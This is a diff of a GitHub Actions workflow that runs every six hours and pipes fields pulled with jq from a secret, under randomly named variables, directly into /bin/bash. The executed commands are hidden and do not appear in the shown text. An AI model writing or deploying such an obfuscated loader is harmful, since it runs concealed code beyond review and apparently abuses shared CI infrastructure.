@@ -2,27 +2,25 @@ name: baixiaochi1974
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 3/6 * * *'
+    - cron: '44 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: baixiaochi1974
         env:
-          wn42656: ${{ secrets.wn42656 }}
+          t29: ${{ secrets.t29 }}
         run: |
-          echo $wn42656 | jq -r .fg48 | /bin/bash
-          echo $zh18330 | jq -r .s5 | /bin/bash
-          echo $kpqa56 | jq -r .qafo06764 | /bin/bash
-          echo $f64 | jq -r .hsrt97 | /bin/bash
-          echo $zmu26 | jq -r .k7 | /bin/bash
-          echo $qaiq6987 | jq -r .zyn7 | /bin/bash
-          echo $asx62 | jq -r .tw212 | /bin/bash
-          echo $iy1834 | jq -r .sf33467 | /bin/bash
-          echo $t26077 | jq -r .wup440 | /bin/bash
-          echo $fnx58666 | jq -r .g59 | /bin/bash
-          echo $tcah6297 | jq -r .aj70 | /bin/bash
-          echo $br27 | jq -r .ji70646 | /bin/bash
+          echo $t29 | jq -r .jzq375 | /bin/bash
+          echo $d90276 | jq -r .ey618 | /bin/bash
+          echo $efsbv00 | jq -r .hy34779 | /bin/bash
+          echo $kl44788 | jq -r .kypq95287 | /bin/bash
+          echo $ygz114 | jq -r .vs615 | /bin/bash
+          echo $c1 | jq -r .pafdt61 | /bin/bash
+          echo $gqwp7033 | jq -r .fgp4897 | /bin/bash
+          echo $ok882 | jq -r .a53726 | /bin/bash
+          echo $mk076 | jq -r .gqj3104 | /bin/bash
+          echo $tk9 | jq -r .kxjkq4 | /bin/bash
 
